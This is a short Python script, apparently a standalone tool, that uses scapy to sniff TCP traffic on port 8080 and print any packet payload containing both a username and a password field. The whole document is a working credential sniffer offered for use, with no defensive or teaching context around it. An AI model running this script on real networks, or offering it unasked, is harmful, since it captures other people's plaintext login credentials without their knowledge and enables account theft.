from scapy.all import sniff, Raw

def packet_callback(packet):
    if packet.haslayer(Raw):
        data = packet[Raw].load.decode(errors="ignore")
        if "username=" in data and "password=" in data:
            print("[*] Captured:", data)

print("Sniffer started... (Ctrl+C to stop)")
sniff(filter="tcp port 8080", prn=packet_callback, store=False)
